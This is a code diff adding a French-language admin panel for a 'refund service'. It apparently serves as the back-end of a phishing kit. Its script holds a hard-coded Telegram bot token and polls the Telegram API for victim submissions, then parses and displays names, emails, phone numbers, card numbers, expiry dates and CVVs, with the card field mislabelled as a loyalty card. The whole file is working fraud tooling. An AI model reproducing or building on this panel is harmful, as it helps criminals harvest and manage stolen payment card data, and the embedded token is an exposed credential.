@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Service Remboursement</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Inter',sans-serif;background:#f1f5f9;min-height:100vh;color:#1e293b}
+
+        .page-bg{background:linear-gradient(180deg,#f1f5f9 0%,#e2e8f0 100%);position:relative}
+        .page-bg::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 10%,rgba(99,102,241,0.04) 0%,transparent 50%);pointer-events:none;z-index:0}
+
+        .header{position:relative;z-index:10;background:rgba(255,255,255,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid rgba(0,0,0,0.04)}
+
+        .stat-card{background:#fff;border:1px solid rgba(0,0,0,0.04);border-radius:16px;padding:20px;transition:all 0.3s;position:relative;overflow:hidden}
+        .stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
+        .stat-card:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.06)}
+        .stat-card.sc-total::before{background:linear-gradient(90deg,#6366f1,#818cf8)}
+        .stat-card.sc-pending::before{background:linear-gradient(90deg,#f59e0b,#fbbf24)}
+        .stat-card.sc-approved::before{background:linear-gradient(90deg,#22c55e,#4ade80)}
+        .stat-card.sc-rejected::before{background:linear-gradient(90deg,#ef4444,#f87171)}
+
+        .table-card{background:#fff;border:1px solid rgba(0,0,0,0.04);border-radius:16px;overflow:hidden}
+        .table-row{transition:all 0.15s}
+        .table-row:hover{background:#f8fafc}
+
+        .search-input{width:100%;padding:10px 12px 10px 36px;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:10px;font-size:13px;font-weight:500;color:#1e293b;transition:all 0.3s;font-family:'Inter',sans-serif}
+        .search-input::placeholder{color:#94a3b8}
+        .search-input:focus{outline:none;border-color:#6366f1;background:#fff;box-shadow:0 0 0 3px rgba(99,102,241,0.08)}
+
+        .filter-select{padding:10px 32px 10px 12px;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:10px;font-size:13px;font-weight:500;color:#475569;appearance:none;-webkit-appearance:none;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.3s}
+        .filter-select:focus{outline:none;border-color:#6366f1;background:#fff}
+
+        .btn-action{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;transition:all 0.2s;cursor:pointer;border:none}
+        .btn-action:hover{transform:scale(1.08)}
+        .btn-action.ba-view{background:#eef2ff;color:#6366f1}
+        .btn-action.ba-view:hover{background:#e0e7ff}
+        .btn-action.ba-approve{background:#f0fdf4;color:#22c55e}
+        .btn-action.ba-approve:hover{background:#dcfce7}
+        .btn-action.ba-reject{background:#fef2f2;color:#ef4444}
+        .btn-action.ba-reject:hover{background:#fee2e2}
+        .btn-action.ba-delete{background:#f8fafc;color:#94a3b8}
+        .btn-action.ba-delete:hover{background:#fef2f2;color:#ef4444}
+
+        .modal-backdrop{position:fixed;inset:0;z-index:100;background:rgba(15,23,42,0.4);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:16px}
+        .modal-box{background:#fff;border-radius:20px;max-width:480px;width:100%;max-height:85vh;overflow-y:auto;box-shadow:0 25px 60px rgba(0,0,0,0.15);border:1px solid rgba(0,0,0,0.04)}
+        .modal-box::-webkit-scrollbar{width:5px}
+        .modal-box::-webkit-scrollbar-thumb{background:#e2e8f0;border-radius:3px}
+
+        .hidden{display:none}
+        .badge{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:8px;font-size:11px;font-weight:700;letter-spacing:0.02em}
+        .badge-pending{background:#fffbeb;color:#d97706;border:1px solid #fde68a}
+        .badge-approved{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
+        .badge-rejected{background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
+
+        .empty-icon{width:56px;height:56px;border-radius:16px;background:#f1f5f9;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+
+        .scrollbar-thin::-webkit-scrollbar{width:5px}
+        .scrollbar-thin::-webkit-scrollbar-track{background:#f8fafc}
+        .scrollbar-thin::-webkit-scrollbar-thumb{background:#e2e8f0;border-radius:3px}
+    </style>
+</head>
+<body class="page-bg min-h-screen">
+
+    <header class="header">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-4">
+                <a href="index.html" class="w-9 h-9 rounded-xl bg-gradient-to-br from-indigo-500 to-blue-500 flex items-center justify-center shadow-md shadow-indigo-500/20 hover:shadow-indigo-500/30 transition-shadow">
+                    <i class="fas fa-arrow-left text-white text-xs"></i>
+                </a>
+                <div>
+                    <h1 class="text-[15px] font-bold text-slate-800">Panel Admin</h1>
+                    <p class="text-[11px] text-slate-400 font-medium">Service Remboursement</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-3">
+                <div class="inline-flex items-center gap-1.5 px-3 py-1.5 bg-emerald-50 border border-emerald-200 rounded-full">
+                    <span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
+                    <span class="text-[11px] font-bold text-emerald-600">En ligne</span>
+                </div>
+                <div class="inline-flex items-center gap-1.5 px-3 py-1.5 bg-indigo-50 border border-indigo-200 rounded-full">
+                    <i class="fas fa-sync-alt text-indigo-500 text-[10px]" style="animation:spin 3s linear infinite"></i>
+                    <span class="text-[11px] font-bold text-indigo-600">Auto-refresh</span>
+                </div>
+                <button onclick="clearAllData()" class="px-3 py-1.5 bg-white border border-slate-200 rounded-xl text-[11px] font-bold text-red-500 hover:text-red-600 hover:bg-red-50 hover:border-red-200 transition-all">
+                    <i class="fas fa-trash mr-1"></i>Tout supprimer
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-6 py-8 relative z-10">
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
+            <div class="stat-card sc-total">
+                <div class="flex items-center justify-between mb-3">
+                    <div class="w-10 h-10 rounded-xl bg-indigo-50 flex items-center justify-center"><i class="fas fa-layer-group text-indigo-500 text-sm"></i></div>
+                    <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Total</span>
+                </div>
+                <p class="text-3xl font-black text-slate-900" id="stat-total">0</p>
+                <p class="text-[11px] text-slate-400 mt-1 font-medium">Demandes totales</p>
+            </div>
+            <div class="stat-card sc-pending">
+                <div class="flex items-center justify-between mb-3">
+                    <div class="w-10 h-10 rounded-xl bg-amber-50 flex items-center justify-center"><i class="fas fa-clock text-amber-500 text-sm"></i></div>
+                    <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">En attente</span>
+                </div>
+                <p class="text-3xl font-black text-slate-900" id="stat-pending">0</p>
+                <p class="text-[11px] text-slate-400 mt-1 font-medium">En cours de traitement</p>
+            </div>
+            <div class="stat-card sc-approved">
+                <div class="flex items-center justify-between mb-3">
+                    <div class="w-10 h-10 rounded-xl bg-emerald-50 flex items-center justify-center"><i class="fas fa-check-circle text-emerald-500 text-sm"></i></div>
+                    <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Approuvées</span>
+                </div>
+                <p class="text-3xl font-black text-slate-900" id="stat-approved">0</p>
+                <p class="text-[11px] text-slate-400 mt-1 font-medium">Remboursements validés</p>
+            </div>
+            <div class="stat-card sc-rejected">
+                <div class="flex items-center justify-between mb-3">
+                    <div class="w-10 h-10 rounded-xl bg-red-50 flex items-center justify-center"><i class="fas fa-times-circle text-red-500 text-sm"></i></div>
+                    <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Refusées</span>
+                </div>
+                <p class="text-3xl font-black text-slate-900" id="stat-rejected">0</p>
+                <p class="text-[11px] text-slate-400 mt-1 font-medium">Demandes refusées</p>
+            </div>
+        </div>
+
+        <div class="table-card">
+            <div class="p-5 border-b border-slate-100">
+                <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+                    <h2 class="text-[15px] font-bold text-slate-800">Demandes de remboursement</h2>
+                    <div class="flex items-center gap-3 w-full sm:w-auto">
+                        <div class="relative flex-1 sm:flex-initial">
+                            <input type="text" id="search-input" placeholder="Rechercher..." class="search-input">
+                            <i class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-xs"></i>
+                        </div>
+                        <select id="filter-status" class="filter-select">
+                            <option value="all">Tous</option>
+                            <option value="en_attente">En attente</option>
+                            <option value="approuve">Approuvé</option>
+                            <option value="refuse">Refusé</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="overflow-x-auto scrollbar-thin">
+                <table class="w-full">
+                    <thead>
+                        <tr class="border-b border-slate-100 bg-slate-50/80">
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">ID</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Nom</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Email</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Téléphone</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Montant</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Statut</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Date</th>
+                            <th class="text-left px-5 py-3 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="submissions-table">
+                        <tr>
+                            <td colspan="8" class="px-5 py-16 text-center">
+                                <div class="empty-icon"><i class="fas fa-inbox text-slate-300 text-xl"></i></div>
+                                <p class="text-slate-400 font-semibold text-sm">Aucune demande</p>
+                                <p class="text-slate-300 text-xs mt-1">Les demandes apparaîtront ici</p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </main>
+
+    <div id="detail-modal" class="modal-backdrop hidden">
+        <div class="modal-box" id="modal-inner">
+            <div class="p-5 border-b border-slate-100 flex items-center justify-between">
+                <h3 class="text-[15px] font-bold text-slate-800">Détails de la demande</h3>
+                <button onclick="closeModal()" class="w-8 h-8 rounded-lg bg-slate-100 hover:bg-slate-200 flex items-center justify-center transition-colors">
+                    <i class="fas fa-times text-slate-400 text-xs"></i>
+                </button>
+            </div>
+            <div id="modal-body" class="p-5"></div>
+            <div id="modal-actions" class="p-5 border-t border-slate-100 flex gap-3">
+                <button onclick="updateStatusFromModal('approuve')" class="flex-1 py-3 rounded-xl text-[13px] font-bold text-white bg-emerald-500 hover:bg-emerald-600 transition-colors shadow-sm">
+                    <i class="fas fa-check mr-2"></i>Approuver
+                </button>
+                <button onclick="updateStatusFromModal('refuse')" class="flex-1 py-3 rounded-xl text-[13px] font-bold text-white bg-red-500 hover:bg-red-600 transition-colors shadow-sm">
+                    <i class="fas fa-times mr-2"></i>Refuser
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script>
+        const TG_TOKEN='8817996571:AAFcKtqkJA4Nn4G_c_SAAPUWqIsodS3DQm4';
+        let currentModalId=null;
+        let lastDataHash='';
+        let lastUpdateId=0;
+
+        function getSubmissions(){return JSON.parse(localStorage.getItem('remboursement_submissions')||'[]')}
+        function saveSubmissions(d){localStorage.setItem('remboursement_submissions',JSON.stringify(d))}
+        function getDataHash(){return localStorage.getItem('remboursement_submissions')||''}
+
+        function parseTelegramMessage(text){
+            const result={nom:'',email:'',telephone:'',operateur:'',amount:'',motif:'',cardNumber:'',cardExpiry:'',cardCvv:'',date:''};
+            const lines=text.split('\n');
+            lines.forEach(line=>{
+                const clean=line.replace(/<[^>]*>/g,'');
+                const parts=clean.split(':');
+                if(parts.length<2)return;
+                const key=parts[0].trim().toLowerCase();
+                const val=parts.slice(1).join(':').trim();
+                if(key.includes('nom'))result.nom=val;
+                else if(key.includes('mail'))result.email=val;
+                else if(key.includes('pho'))result.telephone=val;
+                else if(key.includes('rat'))result.operateur=val;
+                else if(key.includes('montant'))result.amount=val.replace(/\s*\u20ac/,'');
+                else if(key.includes('motif'))result.motif=val;
+                else if(key.includes('carte'))result.cardNumber=val;
+                else if(key.includes('expir'))result.cardExpiry=val;
+                else if(key.includes('cvv'))result.cardCvv=val;
+                else if(key.includes('date'))result.date=val;
+            });
+            return result;
+        }
+
+        async function fetchTelegramUpdates(){
+            try{
+                const url='https://api.telegram.org/bot'+TG_TOKEN+'/getUpdates?offset='+(lastUpdateId+1);
+                const res=await fetch(url);
+                const data=await res.json();
+                if(!data.ok||!data.result.length)return;
+
+                let newFound=false;
+                const submissions=getSubmissions();
+                const existingDates=submissions.map(s=>s.date+'|'+s.nom);
+
+                data.result.forEach(update=>{
+                    lastUpdateId=update.update_id;
+                    if(update.message&&update.message.text){
+                        const text=update.message.text;
+                        if(text.includes('Nouvelle demande de remboursement')){
+                            const parsed=parseTelegramMessage(text);
+                            if(parsed.nom&&parsed.email){
+                                const key=parsed.date+'|'+parsed.nom;
+                                if(!existingDates.includes(key)){
+                                    submissions.push({
+                                        id:update.message.date*1000,
+                                        ...parsed,
+                                        status:'en_attente'
+                                    });
+                                    existingDates.push(key);
+                                    newFound=true;
+                                }
+                            }
+                        }
+                    }
+                });
+
+                if(newFound){
+                    saveSubmissions(submissions);
+                    renderTable();
+                    updateStats();
+                }
+            }catch(e){}
+        }
+
+        function getStatusBadge(s){
+            const m={
+                en_attente:'<span class="badge badge-pending"><i class="fas fa-clock"></i>En attente</span>',
+                approuve:'<span class="badge badge-approved"><i class="fas fa-check"></i>Approuvé</span>',
+                refuse:'<span class="badge badge-rejected"><i class="fas fa-times"></i>Refusé</span>'
+            };
+            return m[s]||m.en_attente;
+        }
+
+        function renderTable(){
+            const all=getSubmissions();
+            const q=document.getElementById('search-input').value.toLowerCase();
+            const f=document.getElementById('filter-status').value;
+            let list=all.filter(s=>{
+                const ms=s.nom.toLowerCase().includes(q)||s.email.toLowerCase().includes(q)||s.telephone.includes(q);
+                const mf=f==='all'||s.status===f;
+                return ms&&mf;
+            }).sort((a,b)=>b.id-a.id);
+
+            const tb=document.getElementById('submissions-table');
+            if(!list.length){
+                tb.innerHTML=`<tr><td colspan="8" class="px-5 py-16 text-center">
+                    <div class="empty-icon"><i class="fas fa-inbox text-slate-300 text-xl"></i></div>
+                    <p class="text-slate-400 font-semibold text-sm">Aucune demande trouvée</p>
+                    <p class="text-slate-300 text-xs mt-1">${all.length===0?'Les demandes apparaîtront ici':'Essayez un autre filtre'}</p>
+                </td></tr>`;
+                return;
+            }
+
+            tb.innerHTML=list.map(s=>{
+                const p=s.status==='en_attente';
+                const acts=p
+                    ?`<div class="flex items-center gap-1.5">
+                        <button onclick="openDetail(${s.id})" class="btn-action ba-view" title="Voir"><i class="fas fa-eye"></i></button>
+                        <button onclick="updateStatus(${s.id},'approuve')" class="btn-action ba-approve" title="Approuver"><i class="fas fa-check"></i></button>
+                        <button onclick="updateStatus(${s.id},'refuse')" class="btn-action ba-reject" title="Refuser"><i class="fas fa-times"></i></button>
+                        <button onclick="deleteSubmission(${s.id})" class="btn-action ba-delete" title="Supprimer"><i class="fas fa-trash"></i></button>
+                    </div>`
+                    :`<div class="flex items-center gap-1.5">
+                        <button onclick="openDetail(${s.id})" class="btn-action ba-view" title="Voir"><i class="fas fa-eye"></i></button>
+                        <button onclick="deleteSubmission(${s.id})" class="btn-action ba-delete" title="Supprimer"><i class="fas fa-trash"></i></button>
+                    </div>`;
+                return `<tr class="table-row border-b border-slate-50">
+                    <td class="px-5 py-3.5 text-xs font-mono text-slate-400">#${s.id}</td>
+                    <td class="px-5 py-3.5 text-[13px] font-semibold text-slate-800">${esc(s.nom)}</td>
+                    <td class="px-5 py-3.5 text-[13px] text-slate-500">${esc(s.email)}</td>
+                    <td class="px-5 py-3.5 text-[13px] text-slate-500">${esc(s.telephone)}</td>
+                    <td class="px-5 py-3.5 text-[13px] font-bold text-indigo-600">${esc(s.amount)} €</td>
+                    <td class="px-5 py-3.5">${getStatusBadge(s.status)}</td>
+                    <td class="px-5 py-3.5 text-[11px] text-slate-400 font-medium">${esc(s.date)}</td>
+                    <td class="px-5 py-3.5">${acts}</td>
+                </tr>`;
+            }).join('');
+        }
+
+        function updateStats(){
+            const s=getSubmissions();
+            document.getElementById('stat-total').textContent=s.length;
+            document.getElementById('stat-pending').textContent=s.filter(x=>x.status==='en_attente').length;
+            document.getElementById('stat-approved').textContent=s.filter(x=>x.status==='approuve').length;
+            document.getElementById('stat-rejected').textContent=s.filter(x=>x.status==='refuse').length;
+        }
+
+        function updateStatus(id,status){
+            const s=getSubmissions();
+            const i=s.findIndex(x=>x.id===id);
+            if(i!==-1){s[i].status=status;saveSubmissions(s);renderTable();updateStats()}
+        }
+
+        function deleteSubmission(id){
+            if(!confirm('Supprimer cette demande ?'))return;
+            saveSubmissions(getSubmissions().filter(s=>s.id!==id));renderTable();updateStats();
+        }
+
+        function clearAllData(){
+            if(!confirm('Supprimer toutes les demandes ?'))return;
+            saveSubmissions([]);renderTable();updateStats();
+        }
+
+        function openDetail(id){
+            const s=getSubmissions().find(x=>x.id===id);
+            if(!s)return;
+            currentModalId=id;
+            const mc=s.cardNumber||'—';
+            document.getElementById('modal-body').innerHTML=`
+                <div class="space-y-0">
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Statut</span>${getStatusBadge(s.status)}</div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Date</span><span class="text-[13px] text-slate-600">${esc(s.date)}</span></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Nom</span><span class="text-[13px] text-slate-900 font-semibold">${esc(s.nom)}</span></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Email</span><span class="text-[13px] text-slate-600">${esc(s.email)}</span></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Téléphone</span><span class="text-[13px] text-slate-600">${esc(s.telephone)}</span></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Opérateur</span><span class="text-[13px] text-slate-600 capitalize">${esc(s.operateur)}</span></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Montant</span><span class="text-[13px] text-indigo-600 font-bold">${esc(s.amount)} €</span></div>
+                    <div class="py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium block mb-1">Motif</span><p class="text-[13px] text-slate-600 leading-relaxed">${esc(s.motif)}</p></div>
+                    <div class="h-px bg-gradient-to-r from-transparent via-slate-200 to-transparent my-3"></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Carte fidélité</span><span class="text-[13px] text-slate-600 font-mono">${esc(mc)}</span></div>
+                    <div class="flex justify-between items-center py-3 border-b border-slate-100"><span class="text-[13px] text-slate-400 font-medium">Expiration</span><span class="text-[13px] text-slate-600">${esc(s.cardExpiry||'—')}</span></div>
+                    <div class="flex justify-between items-center py-3"><span class="text-[13px] text-slate-400 font-medium">CVV</span><span class="text-[13px] text-slate-600 font-mono">${esc(s.cardCvv||'—')}</span></div>
+                </div>`;
+            document.getElementById('detail-modal').classList.remove('hidden');
+            document.body.style.overflow='hidden';
+            document.getElementById('modal-actions').classList.toggle('hidden',s.status!=='en_attente');
+        }
+
+        function closeModal(){document.getElementById('detail-modal').classList.add('hidden');document.body.style.overflow='';currentModalId=null}
+        function updateStatusFromModal(st){if(currentModalId){updateStatus(currentModalId,st);closeModal()}}
+        function esc(t){if(!t)return'';const d=document.createElement('div');d.textContent=t;return d.innerHTML}
+
+        function autoRefresh(){
+            const h=getDataHash();
+            if(lastDataHash!==h){renderTable();updateStats();lastDataHash=h}
+        }
+
+        document.addEventListener('DOMContentLoaded',function(){
+            lastDataHash=getDataHash();renderTable();updateStats();
+            fetchTelegramUpdates();
+            setInterval(fetchTelegramUpdates,5000);
+            setInterval(autoRefresh,2000);
+            document.getElementById('search-input').addEventListener('input',renderTable);
+            document.getElementById('filter-status').addEventListener('change',renderTable);
+            document.getElementById('detail-modal').addEventListener('click',function(e){if(e.target===this)closeModal()});
+            document.addEventListener('keydown',function(e){if(e.key==='Escape')closeModal()});
+        });
+    </script>
+    <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+</body>
+</html>
